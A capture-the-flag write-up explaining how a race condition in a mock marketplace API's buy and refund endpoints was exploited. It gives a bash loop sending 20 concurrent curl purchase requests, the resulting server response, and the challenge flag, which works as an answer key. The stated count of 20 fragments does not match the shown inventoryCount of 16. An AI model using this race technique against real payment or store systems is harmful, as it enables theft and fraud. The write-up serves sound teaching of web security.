---
title: "Flag Market"
ctf: "Vishwa CTF 2026"
date: "2026-04-04"
description: "A race condition vulnerability in an e-commerce API"
points: 500
tags: ["Web", "Race Condition"]
---

## tl;dr

The challenge presents a premium artifacts marketplace called **Node 01**. The goal is to acquire 10 "Flag Fragment" artifacts despite having a limited starting budget of 1000 CR, while each fragment costs 1000 CR.

**Challenge points:** 500

---

## Step 1: Reconnaissance and Analysis

By fetching the homepage and inspecting the source code, I found the client-side logic in `/app.js`. The application is a React-based SPA that interacts with a backend API.

**Key API endpoints identified:**

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/signup` | POST | Register a new user (starts with 1000 CR) |
| `/api/user` | GET | Retrieve current user stats and inventory |
| `/api/items` | GET | List available items and their prices |
| `/api/buy` | POST | Purchase an item using credits |
| `/api/refund` | POST | Roll back a purchase to regain credits |

**Available items:**

| Item | Price |
|------|-------|
| `sticker_pack` | 100 CR |
| `hacker_hoodie` | 500 CR |
| `flag_artifact` | 1000 CR ← **Target: need 10** |
| `elite_membership` | 5000 CR |

---

## Step 2: Identifying the Vulnerability

Since the user starts with exactly 1000 CR, they can only afford one `flag_artifact` legitimately. To get 10, one must either find a way to increase credits or bypass the balance check during purchase.

I hypothesized a **Race Condition** vulnerability in the `/api/buy` endpoint. If the server checks the user's balance and then decrements it without proper atomic operations or locking, multiple concurrent requests might pass the check before the balance is updated to zero.

---

## Step 3: Exploitation — The Race Condition

I created a script to send 20 simultaneous `buy` requests for the `flag_artifact` using `curl` in the background:

```bash
for i in {1..20}; do
  curl -X POST https://market.vishwactf.com/api/buy \
       -H "Content-Type: application/json" \
       -d '{"itemId":"flag_artifact"}' -b cookies.txt &
done
wait
```

### Result

Several requests succeeded before the balance was fully depleted. The server responded with:

```json
{
  "success": true,
  "coins": 0,
  "inventoryCount": 16,
  "message": "ACQUIRED",
  "flag": "VishwaCTF{r4ced_t0_v1ct0ry_044_40_tw0_t1me5}"
}
```

By the time the race finished, 20 fragments had been acquired. The server returned the flag in the response once `inventoryCount` reached the required threshold of 10.

---

## Step 4: Pivots and Further Exploration

I also tested a race condition on the `/api/refund` endpoint. By sending concurrent refund requests for a single item, I was able to "double-refund" it, effectively increasing credits beyond the initial 1000 CR. This allowed purchasing the `elite_membership` (5000 CR), though the `buy` race was already sufficient to obtain the flag.

---

## Conclusion

The application suffered from a classic race condition in its transaction handling. By exploiting the lack of atomicity in the balance-check-and-decrement sequence, multiple high-value items could be acquired simultaneously.

---

## Flag

```
VishwaCTF{r4ced_t0_v1ct0ry_044_40_tw0_t1me5}
```
